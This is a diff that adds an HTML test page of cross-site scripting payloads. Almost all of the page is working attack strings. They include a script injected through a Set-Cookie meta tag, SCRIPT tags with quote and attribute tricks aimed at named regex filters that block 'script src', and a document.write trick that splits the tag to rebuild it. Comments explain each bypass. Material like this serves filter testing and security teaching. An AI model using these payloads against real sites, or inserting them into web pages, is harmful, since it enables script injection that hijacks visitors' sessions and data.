@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+  <title>html-quote</title>
+</head>
+<body>
+  <!-- This was tested in IE, your mileage may vary. For performing XSS on sites that allow "<SCRIPT>" but don't allow "<SCRIPT SRC..." by way of a regex filter "/<script[^>]+src/i" -->
+  <SCRIPT a=">" SRC="./xss.js"></SCRIPT>
+  
+  <!-- For performing XSS on sites that allow "<SCRIPT>" but don't allow "<script src..." by way of a regex filter "/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i" (this is an important one, because I've seen this regex in the wild): -->
+
+  <SCRIPT =">" SRC="./xss.js"></SCRIPT>
+  
+  <!-- Another XSS to evade the same filter, "/<script((\s+\w+(\s*=\s*(?:"(.)*?"|'(.)*?'|[^'">\s]+))?)+\s*|\s*)src/i": -->
+  <SCRIPT a=">" '' SRC="./xss.js"></SCRIPT> 
+  <SCRIPT "a='>'" SRC="./xss.js"></SCRIPT>
+  <SCRIPT a=`>` SRC="./xss.js"></SCRIPT>
+  
+  <!-- Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly: -->
+      
+  <SCRIPT a=">'>" SRC="./xss.js"></SCRIPT>
+  
+  <!-- This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content: -->
+      
+  <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="./xss.js"></SCRIPT>
+</body>
+</html>
